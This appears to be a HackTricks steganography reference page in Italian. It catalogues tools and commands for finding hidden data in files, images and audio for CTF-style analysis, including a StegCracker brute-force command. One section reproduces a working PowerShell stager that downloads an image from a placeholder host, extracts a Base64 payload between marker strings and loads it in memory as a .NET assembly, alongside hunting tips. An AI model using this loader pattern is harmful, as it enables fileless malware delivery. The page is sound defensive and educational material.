# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Estrazione di dati dai file**

### **Binwalk**

Uno strumento per cercare nei file binari file nascosti incorporati e dati. È installato tramite `apt` e il suo codice sorgente è disponibile su [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Recupera file basandosi sulle loro intestazioni e piè di pagina, utile per le immagini png. Si installa tramite `apt` e il sorgente è disponibile su [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Aiuta a visualizzare i metadati dei file, disponibile [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Simile a exiftool, per la visualizzazione dei metadati. Installabile via `apt`, codice sorgente su [GitHub](https://github.com/Exiv2/exiv2), e ha un [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Identifica il tipo di file con cui hai a che fare.

### **Strings**

Estrae stringhe leggibili dai file, usando varie impostazioni di codifica per filtrare l'output.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Utile per confrontare un file modificato con la sua versione originale trovata online.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Estrazione di dati nascosti nel testo**

### **Dati nascosti negli spazi**

Caratteri invisibili in spazi apparentemente vuoti possono nascondere informazioni. Per estrarre questi dati, visita [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Estrazione di dati dalle immagini**

### **Identificazione dei dettagli dell'immagine con GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) serve per determinare i tipi di file immagine e identificare potenziali corruzioni. Esegui il comando qui sotto per ispezionare un'immagine:
```bash
./magick identify -verbose stego.jpg
```
Per tentare di riparare un'immagine danneggiata, aggiungere un commento nei metadata potrebbe aiutare:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide per l'occultamento dei dati**

Steghide consente di nascondere dati all'interno di file `JPEG, BMP, WAV, and AU`, ed è in grado di incorporare ed estrarre dati criptati. L'installazione è semplice usando `apt`, e il suo [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Comandi:**

- `steghide info file` rivela se un file contiene dati nascosti.
- `steghide extract -sf file [--passphrase password]` estrae i dati nascosti, password opzionale.

Per l'estrazione via web, visita [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- To attempt password cracking on Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) as follows:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg per file PNG e BMP**

zsteg è specializzato nel rilevare dati nascosti in file PNG e BMP. L'installazione avviene tramite `gem install zsteg`, with its [source on GitHub](https://github.com/zed-0xff/zsteg).

**Comandi:**

- `zsteg -a file` applica tutti i metodi di rilevamento su un file.
- `zsteg -E file` specifica un payload per l'estrazione dei dati.

### **StegoVeritas and Stegsolve**

**stegoVeritas** controlla i metadata, esegue trasformazioni sull'immagine e applica LSB brute forcing, tra le altre funzionalità. Usa `stegoveritas.py -h` per l'elenco completo delle opzioni e `stegoveritas.py stego.jpg` per eseguire tutti i controlli.

**Stegsolve** applica vari filtri di colore per rivelare testi o messaggi nascosti nelle immagini. È disponibile su [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT per il rilevamento di contenuti nascosti**

Le tecniche di Fast Fourier Transform (FFT) possono rivelare contenuti nascosti nelle immagini. Risorse utili includono:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy per file audio e immagini**

Stegpy permette di incorporare informazioni in file immagine e audio, supportando formati come PNG, BMP, GIF, WebP e WAV. È disponibile su [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck per l'analisi dei file PNG**

Per analizzare file PNG o validarne l'autenticità, usare:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Strumenti aggiuntivi per l'analisi delle immagini**

Per ulteriori approfondimenti, visita:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Payloads Base64 delimitati da marker nascosti nelle immagini (malware delivery)

Commodity loaders nascondono sempre più payloads codificati in Base64 come testo semplice all'interno di immagini altrimenti valide (spesso GIF/PNG). Invece dell'LSB a livello di pixel, il payload è delimitato da stringhe marker uniche di inizio/fine incorporate nel testo/metadata del file. Un PowerShell stager poi:
- Scarica l'immagine via HTTP(S)
- Localizza le stringhe marker (esempi osservati: <<sudo_png>> … <<sudo_odt>>)
- Estrae il testo tra i marker e lo decodifica da Base64 in byte
- Carica l'assembly .NET in memoria e invoca un metodo di entry noto (nessun file scritto su disco)

Snippet PowerShell minimo per carving/loading
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Note
- Questo rientra in ATT&CK T1027.003 (steganography). Le stringhe marker variano tra le campagne.
- Hunting: scansiona le immagini scaricate alla ricerca di delimitatori noti; segnala `PowerShell` che usa `DownloadString` seguito da `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Estrazione di dati da file audio**

**Audio steganography** offre un metodo unico per nascondere informazioni all'interno di file audio. Vengono utilizzati diversi strumenti per incorporare o recuperare contenuti nascosti.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide è uno strumento versatile progettato per nascondere dati in file JPEG, BMP, WAV e AU. Detailed instructions are provided in the [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Questo strumento è compatibile con diversi formati, tra cui PNG, BMP, GIF, WebP e WAV. For more information, refer to [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg è fondamentale per valutare l'integrità dei file audio, fornendo informazioni dettagliate e individuando eventuali discrepanze.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg eccelle nel nascondere ed estrarre dati all'interno di file WAV utilizzando la least significant bit strategy. È disponibile su [GitHub](https://github.com/ragibson/Steganography#WavSteg). I comandi includono:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound permette la cifratura e il rilevamento di informazioni all'interno di file audio usando AES-256. Può essere scaricato dalla [pagina ufficiale](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Strumento prezioso per l'ispezione visiva e analitica di file audio, Sonic Visualizer può rivelare elementi nascosti non rilevabili con altri metodi. Visita il [sito ufficiale](https://www.sonicvisualiser.org/) per maggiori informazioni.

### **DTMF Tones - Dial Tones**

Il rilevamento di toni DTMF in file audio può essere effettuato tramite strumenti online come [this DTMF detector](https://unframework.github.io/dtmf-detect/) e [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

I dati binari la cui lunghezza è il quadrato di un numero intero potrebbero rappresentare un QR code. Usa questo snippet per verificare:
```python
import math
math.sqrt(2500) #50
```
Per la conversione da binario a immagine, consulta [dcode](https://www.dcode.fr/binary-image). Per leggere i codici QR, usa [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Traduzione Braille**

Per la traduzione del Braille, il [Branah Braille Translator](https://www.branah.com/braille-translator) è una risorsa eccellente.

## **Riferimenti**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
